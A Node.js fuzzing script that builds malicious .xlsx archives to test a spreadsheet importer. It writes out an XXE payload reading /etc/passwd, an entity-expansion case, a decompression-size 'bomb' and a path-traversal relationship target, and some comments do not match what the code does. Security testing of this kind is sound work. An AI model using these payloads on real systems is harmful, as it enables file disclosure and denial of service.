// Generate malicious .xlsx (zip) payloads for import fuzzing. Usage: node mkxlsx.mjs <kind> <out>
import { deflateRawSync, crc32 } from 'node:zlib';
import { writeFileSync } from 'node:fs';

function zip(entries) {
  // entries: [{name, data(Buffer), store?:bool}]
  const chunks = [];
  const central = [];
  let offset = 0;
  for (const e of entries) {
    const name = Buffer.from(e.name, 'utf8');
    const raw = Buffer.isBuffer(e.data) ? e.data : Buffer.from(e.data);
    const crc = crc32(raw) >>> 0;
    let comp, method;
    if (e.store) { comp = raw; method = 0; } else { comp = deflateRawSync(raw); method = 8; }
    // optionally lie about sizes
    const size = e.fakeSize ?? raw.length;
    const csize = e.fakeCsize ?? comp.length;
    const lfh = Buffer.alloc(30);
    lfh.writeUInt32LE(0x04034b50, 0);
    lfh.writeUInt16LE(20, 4);
    lfh.writeUInt16LE(0, 6);
    lfh.writeUInt16LE(method, 8);
    lfh.writeUInt16LE(0, 10); lfh.writeUInt16LE(0, 12);
    lfh.writeUInt32LE(crc, 14);
    lfh.writeUInt32LE(csize, 18);
    lfh.writeUInt32LE(size, 22);
    lfh.writeUInt16LE(name.length, 26);
    lfh.writeUInt16LE(0, 28);
    chunks.push(lfh, name, comp);
    const cdh = Buffer.alloc(46);
    cdh.writeUInt32LE(0x02014b50, 0);
    cdh.writeUInt16LE(20, 4); cdh.writeUInt16LE(20, 6);
    cdh.writeUInt16LE(0, 8); cdh.writeUInt16LE(method, 10);
    cdh.writeUInt16LE(0, 12); cdh.writeUInt16LE(0, 14);
    cdh.writeUInt32LE(crc, 16);
    cdh.writeUInt32LE(csize, 20);
    cdh.writeUInt32LE(size, 24);
    cdh.writeUInt16LE(name.length, 28);
    cdh.writeUInt32LE(offset, 42);
    central.push(cdh, name);
    offset += lfh.length + name.length + comp.length;
  }
  const cdStart = offset;
  let cdSize = 0;
  for (const c of central) cdSize += c.length;
  const eocd = Buffer.alloc(22);
  eocd.writeUInt32LE(0x06054b50, 0);
  eocd.writeUInt16LE(central.length / 2, 8);
  eocd.writeUInt16LE(central.length / 2, 10);
  eocd.writeUInt32LE(cdSize, 12);
  eocd.writeUInt32LE(cdStart, 16);
  return Buffer.concat([...chunks, ...central, eocd]);
}

const workbook = `<?xml version="1.0"?><workbook><sheets><sheet name="S" r:id="rId1"/></sheets></workbook>`;
const rels = `<?xml version="1.0"?><Relationships><Relationship Id="rId1" Target="worksheets/sheet1.xml"/></Relationships>`;
const sheetOk = `<worksheet><sheetData><row r="1"><c r="A1" t="inlineStr"><is><t>Название</t></is></c><c r="B1" t="inlineStr"><is><t>Цена</t></is></c></row><row r="2"><c r="A2" t="inlineStr"><is><t>Кола</t></is></c><c r="B2"><v>150</v></c></row></sheetData></worksheet>`;

const kind = process.argv[2];
const out = process.argv[3];
let entries;
if (kind === 'xxe') {
  const ss = `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><sst><si><t>&xxe;</t></si></sst>`;
  entries = [
    { name: 'xl/workbook.xml', data: workbook },
    { name: 'xl/_rels/workbook.xml.rels', data: rels },
    { name: 'xl/worksheets/sheet1.xml', data: sheetOk },
    { name: 'xl/sharedStrings.xml', data: ss },
  ];
} else if (kind === 'laughs') {
  const ss = `<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">]><sst><si><t>&lol2;</t></si></sst>`;
  entries = [
    { name: 'xl/workbook.xml', data: workbook },
    { name: 'xl/_rels/workbook.xml.rels', data: rels },
    { name: 'xl/worksheets/sheet1.xml', data: sheetOk },
    { name: 'xl/sharedStrings.xml', data: ss },
  ];
} else if (kind === 'unknownent') {
  const ss = `<?xml version="1.0"?><sst><si><t>A&evilent;B</t></si></sst>`;
  entries = [
    { name: 'xl/workbook.xml', data: workbook },
    { name: 'xl/_rels/workbook.xml.rels', data: rels },
    { name: 'xl/worksheets/sheet1.xml', data: sheetOk },
    { name: 'xl/sharedStrings.xml', data: ss },
  ];
} else if (kind === 'bomb') {
  // declared size huge, actual tiny: declared 30MB of zeros (> 20MB total limit)
  const big = Buffer.alloc(30 * 1024 * 1024, 0x41);
  entries = [
    { name: 'xl/workbook.xml', data: workbook },
    { name: 'xl/_rels/workbook.xml.rels', data: rels },
    { name: 'xl/worksheets/sheet1.xml', data: sheetOk },
    { name: 'xl/sharedStrings.xml', data: big }, // real deflate of 30MB zeros is tiny, declared=30MB
  ];
} else if (kind === 'slip') {
  // path traversal in sheet target
  const rels2 = `<?xml version="1.0"?><Relationships><Relationship Id="rId1" Target="../../../../etc/passwd"/></Relationships>`;
  entries = [
    { name: 'xl/workbook.xml', data: workbook },
    { name: 'xl/_rels/workbook.xml.rels', data: rels2 },
    { name: 'xl/worksheets/sheet1.xml', data: sheetOk },
  ];
} else {
  throw new Error('kind?');
}
writeFileSync(out, zip(entries));
console.log('wrote', out, kind);
